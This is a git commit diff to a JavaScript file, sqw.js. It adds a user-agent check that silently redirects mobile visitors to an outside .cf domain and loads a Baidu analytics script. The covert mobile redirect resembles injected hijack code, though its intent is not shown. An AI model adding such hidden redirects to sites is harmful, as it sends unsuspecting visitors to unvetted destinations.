9fab00e21a92909d0c0a8d3e41f460c478ba37f9
Jose Chen <63374546+chenqixiang8@users.noreply.github.com>
2021-10-05 14:21:02 -0300

    Update sqw.js

--- sqw.js
+++ sqw.js
@@ -28,3 +28,31 @@
         if( location.href != url ){
                         location.href = url;
         }
+
+
+
+$(document).ready(function() {
+    $(document).foundation();
+})
+
+
+
+function isMobile() {
+if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)))
+return true;
+else
+return false;
+}
+var urlMobile='https://m.mytstartone.cf/';//手机跳转的页面
+if(isMobile() !== false)
+window.location.href=urlMobile;
+
+
+
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?30f3fe19fb775bcc847aa13a5a0daae1";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })(); 
